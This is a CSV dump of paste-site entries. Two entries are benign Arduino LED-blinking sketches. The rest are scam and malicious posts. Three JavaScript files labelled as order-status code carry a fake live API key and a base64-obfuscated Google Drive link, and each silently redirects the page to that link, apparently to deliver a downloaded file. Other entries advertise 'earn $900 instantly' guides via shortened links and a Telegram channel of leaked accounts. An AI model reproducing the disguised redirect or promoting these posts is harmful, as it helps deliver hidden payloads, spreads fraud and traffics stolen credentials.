id,title,username,language,date,content
NAKW0GGq,Products.js,zebmekey,JavaScript,Wednesday 23rd of April 2025 01:04:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03468/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nhy0pbQw,EARN $900 INSTANTLY 2025⭐ WF,JackiperYT,JavaScript,Wednesday 23rd of April 2025 01:01:00 AM CDT," 
Pdf https://tinyurl.com/privguidee


3SiXvNlaeg
"
awfC1k7S,Leaked Accounts - Fresh Hits,WantingTrae,JavaScript,Wednesday 23rd of April 2025 12:55:00 AM CDT,48881 Accounts Posted On https://t.me/leakedbyeminem
hChj39ux,Make $1000 15-MINUTES  (BEGINNER) KB,JackiperYT,JavaScript,Wednesday 23rd of April 2025 12:51:45 AM CDT," 
Pdf https://tinyurl.com/privguidee


pS23LvjOhR
"
MeYhZC6i,Order.js,zebmekey,JavaScript,Wednesday 23rd of April 2025 12:48:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28546/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8KhUrSrB,Claude - FastLED random LEDs updated,BurningWreck,C++,Wednesday 23rd of April 2025 12:45:34 AM CDT,"// This time Claude was told to use EVERY_N_MILLISECONDS

#include <FastLED.h>

// Define the number of LEDs in your strip
#define NUM_LEDS 8
#define DATA_PIN 6  // Connect your NeoPixel data line to this Arduino pin

// Create an array for the LEDs using CRGBArray
CRGBArray<NUM_LEDS> leds;

// Number of random blinking LEDs (LEDs 2-7)
#define NUM_RANDOM_LEDS 6

// Define base timing values for random blinking
#define CHECK_INTERVAL 50      // How often we check for updates
#define MIN_BLINK_TIME 300     // Minimum time in milliseconds
#define MAX_BLINK_TIME 2000    // Maximum time in milliseconds

// Arrays to track state for each random blinking LED
bool blinkState[NUM_RANDOM_LEDS];      
CRGB colors[NUM_RANDOM_LEDS];          
uint16_t nextChangeTime[NUM_RANDOM_LEDS];  // How many milliseconds until this LED changes state

void setup() {
  // Initialize the FastLED library with your strip configuration
  FastLED.addLeds<NEOPIXEL, DATA_PIN>(leds, NUM_LEDS);
  FastLED.setBrightness(64);  // Set to about 25% brightness
  
  // Clear all LEDs to start
  FastLED.clear();
  FastLED.show();
  
  // Initialize random seed
  random16_seed(analogRead(0));
  
  // Initialize random blink timings, states, and colors
  for (int i = 0; i < NUM_RANDOM_LEDS; i++) {
    // Randomize initial states with variation to avoid clusters
    blinkState[i] = (random8(10) > 5 + i % 3) ? true : false;
    
    // Assign an initial delay before the first change
    nextChangeTime[i] = random16(MIN_BLINK_TIME, MAX_BLINK_TIME);
    
    // Generate a random color for each LED
    colors[i] = CHSV(random8(), random8(180, 255), random8(200, 255));
  }
  
  // Turn first two LEDs off
  leds(0, 1) = CRGB::Black;
}

void loop() {
  // Check for LED updates on a regular interval
  EVERY_N_MILLISECONDS(CHECK_INTERVAL) {
    updateRandomLEDs();
  }
  
  // Update the LED strip
  EVERY_N_MILLISECONDS(20) {
    FastLED.show();
  }
}

void updateRandomLEDs() {
  // Using CRGBSet to address LEDs 2 through 7 (indexes 2-7)
  CRGBSet randomLeds(leds(2, 7));
  
  // Check each LED to see if it's time to change state
  for (int i = 0; i < NUM_RANDOM_LEDS; i++) {
    // Decrease the time until next change
    if (nextChangeTime[i] > CHECK_INTERVAL) {
      nextChangeTime[i] -= CHECK_INTERVAL;
    } else {
      // Time to change this LED's state
      blinkState[i] = !blinkState[i];
      
      if (blinkState[i]) {
        // Generate a new random color when turning on
        colors[i] = CHSV(random8(), random8(180, 255), random8(200, 255));
        // Assign new time for how long to stay ON
        nextChangeTime[i] = random16(MIN_BLINK_TIME, MAX_BLINK_TIME);
      } else {
        // Assign new time for how long to stay OFF (slightly different range)
        nextChangeTime[i] = random16(MIN_BLINK_TIME + 100, MAX_BLINK_TIME - 200);
      }
    }
    
    // Set LED to either its color or black based on current state
    randomLeds[i] = blinkState[i] ? colors[i] : CRGB::Black;
  }
}"
TesHuHph,EARN $900 INSTANTLY 2025 TA,JackiperYT,JavaScript,Wednesday 23rd of April 2025 12:42:29 AM CDT," 
Pdf https://tinyurl.com/privguidee


JqSBvk1dvy
"
WSxYPYAn,Claude - FastLED random LEDs,BurningWreck,C++,Wednesday 23rd of April 2025 12:41:50 AM CDT,"// Claude's code for a set of randomly blinking LEDs using CRGBArray / CRGBSet
// 8 strip Neopixel, first two are excluded from the blinking effect

#include <FastLED.h>

// Define the number of LEDs in your strip
#define NUM_LEDS 8
#define DATA_PIN 6  // Connect your NeoPixel data line to this Arduino pin

// Create an array for the LEDs using CRGBArray
CRGBArray<NUM_LEDS> leds;

// Define timing for random color blinking
#define RANDOM_BLINK_MIN 300    // Minimum time a random LED stays in its state
#define RANDOM_BLINK_MAX 2000   // Maximum time a random LED stays in its state

// Number of random blinking LEDs (LEDs 2-7)
#define NUM_RANDOM_LEDS 6

// Arrays to track timing and state for each random blinking LED
unsigned long previousMillis[NUM_RANDOM_LEDS]; 
unsigned long intervals[NUM_RANDOM_LEDS];      
bool blinkState[NUM_RANDOM_LEDS];              
CRGB colors[NUM_RANDOM_LEDS];                  

void setup() {
  // Initialize the FastLED library with your strip configuration
  FastLED.addLeds<NEOPIXEL, DATA_PIN>(leds, NUM_LEDS);
  FastLED.setBrightness(64);  // Set to about 25% brightness
  
  // Clear all LEDs to start
  FastLED.clear();
  FastLED.show();
  
  // Initialize random seed
  randomSeed(analogRead(0));
  
  // Initialize random blink timings, states, and colors
  for (int i = 0; i < NUM_RANDOM_LEDS; i++) {
    // Stagger the starting times
    previousMillis[i] = millis() - random(0, 1000);
    
    // Randomize initial states with variation to avoid clusters
    blinkState[i] = (random(10) > 5 + i % 3) ? true : false;
    
    // Assign random intervals
    intervals[i] = random(RANDOM_BLINK_MIN, RANDOM_BLINK_MAX);
    
    // Generate a random color for each LED
    colors[i] = CHSV(random8(), random(180, 255), random(200, 255));
  }
  
  // Turn first two LEDs off
  leds(0, 1) = CRGB::Black;
}

void loop() {
  // Run the random blinking function
  randomBlink();
  
  // Update the LED strip
  FastLED.show();
  
  // Small delay to prevent flickering
  delay(10);
}

void randomBlink() {
  // Using CRGBSet to address LEDs 2 through 7 (indexes 2-7)
  CRGBSet randomLeds(leds(2, 7));
  
  // Get the current time
  unsigned long currentMillis = millis();
  
  // Check each LED in the random set
  for (int i = 0; i < NUM_RANDOM_LEDS; i++) {
    // Check if it's time to update this LED based on its custom interval
    if (currentMillis - previousMillis[i] >= intervals[i]) {
      previousMillis[i] = currentMillis;
      
      // Toggle state
      blinkState[i] = !blinkState[i]; 
      
      if (blinkState[i]) {
        // Generate a new random color when turning on
        colors[i] = CHSV(random8(), random(180, 255), random(200, 255));
        // Generate a new random interval for on state
        intervals[i] = random(RANDOM_BLINK_MIN, RANDOM_BLINK_MAX);
      } else {
        // Generate a new random interval for off state
        intervals[i] = random(RANDOM_BLINK_MIN + 100, RANDOM_BLINK_MAX - 200);
      }
    }
    
    // Set LED to either its color or black based on current state
    if (blinkState[i]) {
      randomLeds[i] = colors[i];
    } else {
      randomLeds[i] = CRGB::Black;
    }
  }
}"
bSe3Zxkc,Chaturbate with Tokens,WantingTrae,JavaScript,Wednesday 23rd of April 2025 12:39:39 AM CDT,65804 Accounts Posted On https://t.me/leakedbyeminem
Ru7psU7z,Market.js,zebmekey,JavaScript,Wednesday 23rd of April 2025 12:33:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79281/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
